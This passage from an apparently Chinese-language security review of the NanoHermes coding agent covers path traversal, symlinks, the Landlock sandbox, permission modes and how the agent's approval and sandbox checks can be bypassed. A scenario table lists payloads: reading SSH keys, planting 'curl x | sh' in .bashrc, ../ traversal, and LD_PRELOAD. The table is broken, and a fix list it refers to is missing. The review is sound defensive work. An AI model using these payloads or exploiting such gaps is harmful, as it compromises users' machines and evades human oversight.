<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;path {} resolves outside the workspace&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">real</span><span class="p">.</span><span class="n">display</span><span class="p">()));</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nb">Ok</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div>


三步各有用处：第一步挡住 <code>..</code>，第二步挡住绝对路径（<code>/etc/passwd</code> 不以 root 开头），第三步挡住符号链接。第三步只在路径存在时能做——新建文件的符号链接攻击要靠「对父目录做 canonicalize」来补，这一层通常会漏。

顺带说一句 <code>PathBuf::pop()</code> 的一个陷阱：当路径是 <code>/</code> 时 <code>pop</code> 返回 false 且不变，所以 <code>../../../etc/passwd</code> 会规范化成 <code>/etc/passwd</code>——这恰好被第二步挡住，但如果 root 在 <code>/</code> 下且比较用的是 <code>starts_with</code>，要小心别把 <code>/</code> 当成合法的 root。
<h2>符号链接：内核沙箱与内置工具的差异</h2>

符号链接这一节单独讲，因为 Landlock 和内置工具的语义在这里<strong>完全相反</strong>。

Landlock 的 <code>path_beneath</code> 规则是按「打开文件时解析出的真实路径」判定的。如果工作区里有一个软链接指向 <code>/etc/passwd</code>：
<div class="codehilite"><pre><span></span><code>ln -s /etc/passwd ws/link
</code></pre></div>


那么沙箱里的命令 <code>echo x &gt;&gt; ws/link</code> 会被拒绝——因为内核解析 <code>link</code> 得到 <code>/etc/passwd</code>，而 <code>/etc/passwd</code> 那条路径只有 <code>READ_EXEC</code> 权限。Landlock 在这里是可靠的。

内置工具没有这层保护。<code>write_file</code> 走 <code>fs::write</code>，它跟随符号链接（<code>O_CREAT|O_TRUNC</code> 默认不 <code>O_NOFOLLOW</code>），所以 <code>write_file(path="link", content="x")</code> 会写到 <code>/etc/passwd</code>。

于是出现一个荒谬的组合：<strong>开 <code>workspace-write</code> 沙箱之后，<code>run_command</code> 不能写 <code>/etc/passwd</code>，但 <code>write_file</code> 可以</strong>。安全强度取决于调用哪个工具，而不是取决于配置。

这个反直觉的差异正是「沙箱只覆盖子进程」的直接后果。修法只有上一节那个第三步：
<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="n">real</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">out</span><span class="p">.</span><span class="n">canonicalize</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">!</span><span class="n">real</span><span class="p">.</span><span class="n">starts_with</span><span class="p">(</span><span class="o">&amp;</span><span class="n">root_real</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="o">..</span><span class="p">.)</span><span class="w"> </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>


对新建文件（路径不存在），<code>canonicalize</code> 失败，第三步跳过——这就是漏洞所在。补法是「对最深的已存在祖先做 canonicalize，再把剩余的不存在部分拼回去」：
<div class="codehilite"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">ancestor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">out</span><span class="p">.</span><span class="n">clone</span><span class="p">();</span>
<span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Vec</span><span class="p">::</span><span class="n">new</span><span class="p">();</span>
<span class="k">while</span><span class="w"> </span><span class="o">!</span><span class="n">ancestor</span><span class="p">.</span><span class="n">exists</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ancestor</span><span class="p">.</span><span class="n">file_name</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">tail</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">name</span><span class="p">.</span><span class="n">to_os_string</span><span class="p">());</span><span class="w"> </span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">!</span><span class="n">ancestor</span><span class="p">.</span><span class="n">pop</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="p">}</span>
<span class="kd">let</span><span class="w"> </span><span class="n">real_ancestor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ancestor</span><span class="p">.</span><span class="n">canonicalize</span><span class="p">()</span><span class="o">?</span><span class="p">;</span>
<span class="kd">let</span><span class="w"> </span><span class="n">real_full</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">real_ancestor</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">tail</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">rev</span><span class="p">().</span><span class="n">collect</span><span class="p">::</span><span class="o">&lt;</span><span class="n">PathBuf</span><span class="o">&gt;</span><span class="p">());</span>
<span class="k">if</span><span class="w"> </span><span class="o">!</span><span class="n">real_full</span><span class="p">.</span><span class="n">starts_with</span><span class="p">(</span><span class="o">&amp;</span><span class="n">root_real</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="o">..</span><span class="p">.)</span><span class="w"> </span><span class="p">}</span>
</code></pre></div>


这段大约 15 行，但它是「新建文件时防止穿越软链接」的唯一正确做法。少了它，攻击方式就是：先在仓库里提交一个指向 <code>~/.ssh</code> 的软链接目录，再让 agent 往「仓库内」写文件。
<h2>四个逃逸面</h2>

把前面的分析收拢，内置工具与子进程这两条路径的差异集中在四个面上：
<div class="table-scroll"><table>
<thead>
<tr>
<th>逃逸面</th>
<th>子进程（<code>run_command</code>）</th>
<th>内置工具</th>
<th>差异根源</th>
</tr>
</thead>
<tbody>
<tr>
<td>绝对路径</td>
<td>Landlock 限写</td>
<td>直通</td>
<td>沙箱在子进程</td>
</tr>
<tr>
<td><code>..</code> 穿越</td>
<td>Landlock 按真实路径判定</td>
<td>直通</td>
<td><code>resolve</code> 不规范化</td>
</tr>
<tr>
<td>符号链接</td>
<td>内核解析真实路径</td>
<td>跟随且不检查</td>
<td><code>fs::write</code> 语义</td>
</tr>
<tr>
<td>网络</td>
<td>不限制（net=0）</td>
<td>不限制</td>
<td>两者都不管</td>
</tr>
</tbody>
</table></div>

四个面里，前三个都是「子进程有保护、内置工具没有」。第四个是两者都没有。

这个表说明一件事：<strong>在这套设计里，「安全强度」取决于模型选择用哪个工具</strong>。同一个目标（写 <code>/etc/passwd</code>），走 <code>run_command</code> 会被沙箱挡住（如果开了），走 <code>write_file</code> 则畅通无阻。而模型并不知道这个区别——它只知道「哪个工具更顺手」。

所以真正需要修的不是某一道闸门，而是<strong>把内置工具纳入同一套路径策略</strong>。最经济的实现是让 <code>resolve</code> 直接返回 <code>Result</code>，强制所有调用点处理「越界」——这是一个编译期就能推动的改动：改了签名之后，所有 <code>let full = resolve(...)</code> 都会编译失败，编译器会列出所有需要处理的点。
<h2>权限模式与沙箱的交叉矩阵</h2>

<code>PermissionMode</code> 和 <code>SandboxMode</code> 是两个正交的维度，但用户经常只调其中一个，于是出现一些组合的预期和实际不符：
<div class="table-scroll"><table>
<thead>
<tr>
<th>模式 \ 沙箱</th>
<th><code>off</code></th>
<th><code>read-only</code></th>
<th><code>workspace-write</code></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>default</code></td>
<td>全开</td>
<td>子进程只读</td>
<td>子进程限写工作区</td>
</tr>
<tr>
<td><code>accept-edits</code></td>
<td>编辑免问，命令问</td>
<td>同左 + 子进程只读</td>
<td>同左 + 子进程限写</td>
</tr>
<tr>
<td><code>plan</code></td>
<td>只读（无命令）</td>
<td>只读（无命令）</td>
<td>只读（无命令）</td>
</tr>
<tr>
<td><code>goal</code></td>
<td><strong>全开且不问</strong></td>
<td>命令全失败（非 Linux）</td>
<td>子进程限写</td>
</tr>
<tr>
<td><code>debug</code></td>
<td>可跑命令、不可写</td>
<td>可跑命令、不可写</td>
<td>子进程限写</td>
</tr>
</tbody>
</table></div>

两个值得注意的格子：

<strong><code>plan</code> 那一行，沙箱完全没用。</strong> 因为 <code>run_command</code> 被模式封禁了，而沙箱只作用于子进程——没有子进程，沙箱就没有作用对象。所以 <code>plan</code> 模式的安全强度不随沙箱变化。但同时，<code>plan</code> 模式下的 <code>write_file</code> 也被封了，所以它反而是安全的（只要内置工具被正确封禁）。

<strong><code>goal</code> 那一行，<code>off</code> 是最危险的组合。</strong> 无人监督 + 无审批 + 无沙箱 = 模型可以完全自由地操作这台机器。代码本身没有阻止这个组合，只是 <code>sandbox</code> 默认 <code>off</code>，所以<strong>默认的 <code>goal</code> 模式就是最危险的那一格</strong>。

这说明「模式」和「沙箱」不该是两个独立的 flag，而应该是一个「安全等级」的枚举，每个等级固定一组配置：
<div class="codehilite"><pre><span></span><code>--safety low     auto_approve=true,  sandbox=off
--safety medium  auto_approve=false, approval=on-request, sandbox=workspace-write
--safety high    auto_approve=false, approval=untrusted, sandbox=read-only, network=deny
</code></pre></div>


两个 flag 的组合有 15 种，其中大部分没人会主动选，而有几种是危险的。用等级枚举把「有意义的组合」固化下来，比让用户自由组合更安全，也更好解释。
<h2>plan 模式为什么不是只读沙箱</h2>

这里值得专门澄清一个常见误解：<code>plan</code> 模式看起来像「只读沙箱」，但它不是，差别有三点。

<strong>第一，它封的是工具，不是路径。</strong> <code>plan</code> 让 <code>write_file</code> 不可用，所以 agent 不能写文件。但它没有让「文件不可写」——<code>run_command</code> 也被封了，所以确实没有写路径了。这一层是有效的，但它的实现方式是「把可能写的东西都拿走」，而不是「允许一切但拒绝写」。后者才能覆盖未来新增的工具：如果明天加了一个 <code>db_query</code> 工具（可以 <code>UPDATE</code>），<code>plan</code> 模式不会自动封它。

<strong>第二，它不限制读。</strong> <code>plan</code> 模式下协议上是要「读代码、想方案」，所以 <code>read_file</code> 完全可用，能读全盘。这和沙箱的 <code>read-only</code> 完全不同——后者限制的是写，读也是全开。两个「只读」的含义不同：<code>plan</code> 是「我不改」，沙箱 <code>read-only</code> 是「进程不能改」。

<strong>第三，它依赖 <code>blocked_tools</code> 这张手写表。</strong> 五个工具名是硬编码的：
<div class="codehilite"><pre><span></span><code><span class="n">PermissionMode</span><span class="p">::</span><span class="n">Plan</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">&amp;</span><span class="p">[</span>
<span class="w">    </span><span class="s">&quot;write_file&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="s">&quot;edit_file&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="s">&quot;apply_patch&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="s">&quot;run_command&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="s">&quot;git_commit&quot;</span><span class="p">,</span>
<span class="p">],</span>
</code></pre></div>


如果新增一个能写文件的工具（比如 <code>git_apply</code>、<code>sql_exec</code>），必须记得加进这张表。忘了的话，<code>plan</code> 模式会静默地漏一个写入口。这类「靠维护列表保证安全」的机制，缺陷率随时间单调上升。

更稳的做法是给每个工具打一个 <code>capability</code> 标签（<code>fs.read</code>、<code>fs.write</code>、<code>process.spawn</code>、<code>net.egress</code>），模式封的是标签而不是名字：
<div class="codehilite"><pre><span></span><code><span class="k">pub</span><span class="w"> </span><span class="k">fn</span><span class="w"> </span><span class="nf">blocked_capabilities</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="kp">&amp;</span><span class="o">&#39;</span><span class="nb">static</span><span class="w"> </span><span class="p">[</span><span class="n">Capability</span><span class="p">]</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">match</span><span class="w"> </span><span class="bp">self</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">PermissionMode</span><span class="p">::</span><span class="n">Plan</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">&amp;</span><span class="p">[</span><span class="n">Capability</span><span class="p">::</span><span class="n">FsWrite</span><span class="p">,</span><span class="w"> </span><span class="n">Capability</span><span class="p">::</span><span class="n">ProcessSpawn</span><span class="p">,</span><span class="w"> </span><span class="n">Capability</span><span class="p">::</span><span class="n">GitWrite</span><span class="p">],</span>
<span class="w">        </span><span class="n">PermissionMode</span><span class="p">::</span><span class="n">Debug</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">&amp;</span><span class="p">[</span><span class="n">Capability</span><span class="p">::</span><span class="n">FsWrite</span><span class="p">,</span><span class="w"> </span><span class="n">Capability</span><span class="p">::</span><span class="n">GitWrite</span><span class="p">],</span>
<span class="w">        </span><span class="n">_</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">&amp;</span><span class="p">[],</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>


这样新增工具时只要标了标签就自动被覆盖。改动大概 100 行（给 24 个工具各加一个标签），但它把「安全靠记得」变成了「安全靠分类」。
<h2>goal 模式：没有人可以问</h2>

<code>goal</code> 模式的定位是「无人值守跑到目标达成」，所以它做了两件事：<code>auto_approve = true</code>、<code>approval = Never</code>。这两件事加起来等于「审批这道闸门被永久关闭」。

这个设计是诚实的，但它把安全责任完全压到了另外三道闸门上：
<div class="table-scroll"><table>
<thead>
<tr>
<th>闸门</th>
<th>在 goal 模式下的状态</th>
</tr>
</thead>
<tbody>
<tr>
<td>工具清单</td>
<td>有效（模型看不到被封禁的）</td>
</tr>
<tr>
<td><code>check_tool</code></td>
<td>有效（但 <code>goal</code> 不封任何工具）</td>
</tr>
<tr>
<td>PreToolUse 钩子</td>
<td>有效（唯一的自定义拦截点）</td>
</tr>
<tr>
<td>审批</td>
<td><strong>关闭</strong></td>
</tr>
<tr>
<td>Landlock</td>
<td>取决于 <code>--sandbox</code>（默认 off）</td>
</tr>
</tbody>
</table></div>

所以 <code>goal</code> 模式的实际安全强度 = 「钩子配了什么」+「沙箱开没开」。如果两个都没配（默认情况），安全强度是零。

对无人值守场景，至少应该做这三件事：

<strong>第一，默认开沙箱。</strong> <code>goal</code> 模式下如果 <code>sandbox == Off</code>，启动时应该警告甚至拒绝。因为「没有人看着」和「没有任何文件系统限制」的组合，出事只是时间问题。

<strong>第二，强制配置钩子。</strong> 可以要求 <code>goal</code> 模式下至少有一个 PreToolUse 钩子，否则拒绝启动。钩子是唯一能在无人值守时表达「不要碰这些路径」的机制。

<strong>第三，加预算上限。</strong> 无人值守意味着可能无限循环。<code>max_iterations: 40</code> 是轮次上限，但没有「总命令数」「总写入字节」「总耗时」的上限。加一个 <code>max_wall_clock</code>（比如 30 分钟）是必要的——一个跑飞的目标模式可能在半小时内产生上百次写入。

这三条都不复杂，但它们把「goal 模式有多危险」从「取决于用户配置」变成「有明确下限」。
<h2>交叉验证：七个攻击场景</h2>

把前面所有分析放进具体场景，看每一道闸门是否真的挡住了。假设是默认配置（<code>auto_approve: true</code>、<code>sandbox: off</code>、<code>permission_mode: default</code>），只有 <code>check_tool</code> 和钩子在起作用。
<div class="table-scroll"><table>
<thead>
<tr>
<th>场景</th>
<th>载荷</th>
<th>通过哪些闸门</th>
<th>结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>1 读密钥</td>
<td><code>read_file("~/.ssh/id_rsa")</code></td>
<td>全部</td>
<td>内容进上下文并出网</td>
</tr>
<tr>
<td>2 写启动项</td>
<td><code>write_file("/home/u/.bashrc", "curl x \| sh")</code></td>
<td>全部</td>
<td>持久化后门</td>
</tr>
<tr>
<td>3 穿越</td>
<td><code>read_file("../../../../etc/passwd")</code></td>
<td>全部</td>
<td>读到系统文件</td>
</tr>
<tr>
<td>4 假只读</td>
<td><code>run_command("sort -o ~/.bashrc x")</code></td>
<td>审批（误判为只读）</td>

</tr>
<tr>
<td>5 冒名程序</td>
<td><code>run_command("/tmp/x/ls -la")</code></td>

</tr>

<td>6 预加载</td>
<td><code>run_command("LD_PRELOAD=/tmp/e.so ls")</code></td>

</tr>
<tr>

</tr>
</tbody>

七个场景没有一个是「精巧的攻击链」——每一个都是单步、单条命令、不含任何混淆。它们能通过的原因是同一个：<strong>判定依据是「命令长什么样」，而不是「它实际会做什么」</strong>。

再叠加 <code>goal</code> 模式（审批关闭）：场景 1、2、3 依然通过，场景 4 到 7 也从「被误判放行」变成「连误判都不需要」——审批整道闸门都没了。这个对比说明一件事：<strong><code>auto_approve: true</code> 已经让审批形同虚设，所以 <code>goal</code> 模式在默认配置下没有额外损失，损失已经发生了。</strong>

如果配上 <code>--ask</code>（<code>auto_approve: false</code> + <code>untrusted</code>）和 <code>--sandbox workspace-write</code>，场景 4 到 7 全部会被问到（<code>untrusted</code> 连只读也问），但<strong>场景 1、2、3 仍然全部通过</strong>——它们全是内置文件工具，而内置文件工具没有任何路径限制。

这是全文最重要的结论：在这套设计里，最有效的加固不是调审批策略，而是给 <code>resolve</code> 加越界检查，因为前三类场景是最高频、最容易被模型无意触发的（模型可能真的只是想读一个「在仓库外一层」的配置文件）。

前三项是真正的修复，后四项是策略调整。

<strong>第 1 项最关键，也最容易做错。</strong> 它要改 <code>resolve</code> 的签名（返回 <code>Result</code>），这会引发一串编译错误——每一处错误都是一个需要决定「越界时怎么办」的地方。<code>read_file</code> 应该返回错误，<code>write_file</code> 应该返回错误，但会话文件（<code>~/.nanohermes/sessions/*.json</code>）和记忆目录必须允许。所以需要两个入口：工作区路径走 <code>resolve_checked</code>，系统路径走一个显式的 <code>resolve_system</code>（并且只允许内部代码调用，不接受模型的路径参数）。

<strong>第 2 项的判定要和 <code>VALUE_FLAGS</code> 一样的思路</strong>：不是「信任程序」，而是「信任程序 + 参数组合」。现在实现是「边走边判」，<code>git_subcommand_is_read_only</code> 还把 <code>tokens</code> 消费掉了，所以每加一条规则都要动同一段循环——这是它积累了四个洞的结构性原因。更好的做法是把命令行先解析成一个中间结构（程序名、显式路径、环境赋值、参数列表各一组），再让四条判定各查各的字段。

<strong>第 6 项只有 3 行，但它改变的是「默认值」。</strong> 默认值的影响力远大于任何单点修复：它决定了所有没读文档的用户实际受到的防护。安全领域有个原则叫「默认安全」（secure by default），指的就是这个——不是让用户去开开关，而是让开关默认是开的，需要的人自己去关。

<strong>第 7 项是给无人值守场景兜底。</strong> <code>goal</code> 模式的合理前提是「沙箱可用 + 钩子已配」，否则它和一个 <code>while true; do $SHELL; done</code> 没有本质区别。启动时检查这两项，缺一个就拒绝，这是最省事的做法。
<h2>怎么测试安全边界</h2>

安全功能的测试和功能测试不一样：它测的是「不该发生的事有没有发生」。

NanoHermes 的沙箱测试是这个思路的直接体现——不是断言「命令成功」，而是断言「命令失败且文件不存在」：
<div class="codehilite"><pre><span></span><code><span class="c1">// read-only: 工作区内的写入也必须被拒</span>
<span class="fm">assert_eq!</span><span class="p">(</span>
<span class="w">    </span><span class="n">run_sandboxed</span><span class="p">(</span>
<span class="w">        </span><span class="o">&amp;</span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;touch {}/a&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ws</span><span class="p">.</span><span class="n">display</span><span class="p">()),</span>
<span class="w">        </span><span class="n">SandboxMode</span><span class="p">::</span><span class="n">ReadOnly</span><span class="p">,</span>
<span class="w">        </span><span class="o">&amp;</span><span class="n">ws</span>
<span class="w">    </span><span class="p">),</span>
<span class="w">    </span><span class="nb">Some</span><span class="p">(</span><span class="kc">false</span><span class="p">),</span>
<span class="w">    </span><span class="s">&quot;read-only sandbox must deny writes&quot;</span>
<span class="p">);</span>
<span class="fm">assert!</span><span class="p">(</span><span class="o">!</span><span class="n">ws</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">&quot;a&quot;</span><span class="p">).</span><span class="n">exists</span><span class="p">());</span>

<span class="c1">// workspace-write: 工作区内的写入允许</span>
<span class="fm">assert_eq!</span><span class="p">(</span>
<span class="w">    </span><span class="n">run_sandboxed</span><span class="p">(</span><span class="o">&amp;</span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;touch {}/b&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ws</span><span class="p">.</span><span class="n">display</span><span class="p">()),</span>
<span class="w">                 </span><span class="n">SandboxMode</span><span class="p">::</span><span class="n">WorkspaceWrite</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ws</span><span class="p">),</span>
<span class="w">    </span><span class="nb">Some</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span>
<span class="p">);</span>
<span class="fm">assert!</span><span class="p">(</span><span class="n">ws</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">&quot;b&quot;</span><span class="p">).</span><span class="n">exists</span><span class="p">());</span>

<span class="c1">// workspace-write: 工作区外的写入拒绝</span>
<span class="fm">assert_eq!</span><span class="p">(</span>
<span class="w">    </span><span class="n">run_sandboxed</span><span class="p">(</span><span class="o">&amp;</span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;touch {}/c&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">outside</span><span class="p">.</span><span class="n">display</span><span class="p">()),</span>
<span class="w">                 </span><span class="n">SandboxMode</span><span class="p">::</span><span class="n">WorkspaceWrite</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ws</span><span class="p">),</span>
<span class="w">    </span><span class="nb">Some</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span>
<span class="p">);</span>
<span class="fm">assert!</span><span class="p">(</span><span class="o">!</span><span class="n">outside</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">&quot;c&quot;</span><span class="p">).</span><span class="n">exists</span><span class="p">());</span>
</code></pre></div>


三个断言覆盖了「可能出错的两个方向」：该拒的拒了（<code>a</code>、<code>c</code>），该放的放了（<code>b</code>）。第三个尤其重要——如果沙箱装错了（比如规则集创建失败但被忽略），<code>b</code> 会失败，测试立刻发现「沙箱把所有东西都拦住了」，而不是等到线上「所有命令都跑不了」。

<code>needs_approval</code> 的测试是分层断言，第一行专门钉住那个短路：<code>auto_approve</code> 优先于 <code>Untrusted</code>，所以 <code>needs_approval(true, Untrusted, "rm -rf /")</code> 必须返回 <code>false</code>。这种「两个配置项的组合语义」最容易在重构中悄悄改变，必须有测试兜住。其余三行分别覆盖 <code>Never</code> 全放、<code>Untrusted</code> 连 <code>ls</code> 都问、<code>OnRequest</code> 只问非只读。

<code>is_trusted_command</code> 的测试分正向和反向两组，正向里有一条值得注意：<code>git -C /repo diff --stat</code> 必须判为可信，它验证的是「带值 flag 的下一个 token 被跳过」这段逻辑。

但<strong>测试里没有覆盖本文发现的四个洞</strong>：<code>sort -o</code>、<code>/tmp/ls</code>、<code>LD_PRELOAD</code>、<code>git status</code>（别名）。这恰好说明安全测试的一个通病：<strong>容易测「已知的攻击」，难测「没想到的攻击」</strong>。

补这个缺口的方法不是「再加几条断言」——那只能覆盖你已经想到的洞。更有效的是<strong>用性质（property）而不是用例来测</strong>：
<div class="table-scroll"><table>
<thead>
<tr>
<th>性质</th>
<th>怎么测</th>
</tr>
</thead>
<tbody>
<tr>
<td>可信命令不应能写文件</td>
<td>在只读临时目录里跑每条可信命令的常见 flag 变体，断言目录内容不变</td>
</tr>
<tr>
<td>沙箱内的写入不越界</td>
<td>在工作区外放哨兵文件，断言内容不变</td>
</tr>
<tr>
<td>审批覆盖所有执行路径</td>
<td>枚举所有会 spawn 的工具，断言每个都调了 <code>needs_approval</code></td>
</tr>
</tbody>
</table></div>

第一条可以用脚本做：对白名单里每个程序，跑「程序名 + 各种常见 flag」的组合，检测临时目录有没有文件被创建。这能自动发现 <code>sort -o</code> 这类问题，因为它不依赖你知道 <code>sort</code> 有 <code>-o</code>。第三条是个静态检查：<code>rg 'Command::new|shell_command' src/</code> 找到所有 spawn 点，逐个确认上游有审批——漏掉一个路径在运行时可能永远不触发，静态看得见。
<h2>小结：先假设最坏，再逐层放宽</h2>

把这篇收拢成三句话。

<strong>第一，安全是「纵深」，不是「强度」。</strong> 五道闸门各自都能被绕过：工具清单只影响广告，<code>check_tool</code> 只按名字封，钩子是用户自己配的，审批只覆盖 shell，沙箱只覆盖子进程。但五道叠起来，一个攻击要同时绕过五层才能完全无声。这比「一道特别强的闸门」更可靠，因为强闸门有单点失效的风险。

<strong>第二，最薄的一层往往不是你以为的那一层。</strong> 直觉上「沙箱」是最硬的防线——它确实是最硬的，但它覆盖面最窄。真正的窟窿在「内置文件工具完全不受路径约束」，而那是个看起来最无害的地方：一个 <code>fs::write</code> 调用，没有子进程，没有 shell，没有审批。安全评审里最容易漏的就是这类「自己进程内的直接 I/O」。

<strong>第三，默认值就是安全级别。</strong> <code>auto_approve: true</code> + <code>sandbox: Off</code> 这两个默认值，让五道闸门里的两道直接失效。任何单点加固的价值都不如改这两个默认值——但改默认值会改变所有现有用户的行为，所以它需要一个明确的迁移决策，而不是顺手改掉。

NanoHermes 的安全实现有一个诚实的地方值得肯定：它不假装自己很安全。<code>attach</code> 在内核不支持时拒绝执行而不是降级，<code>auto_approve</code> 的短路写在第一行不加掩饰，<code>goal</code> 模式的注释直接说「没有人在旁边可以问」。这种「明确说出边界」的做法，比「声称安全但边界模糊」要好得多——因为只有知道边界在哪，才知道该往哪里加固。
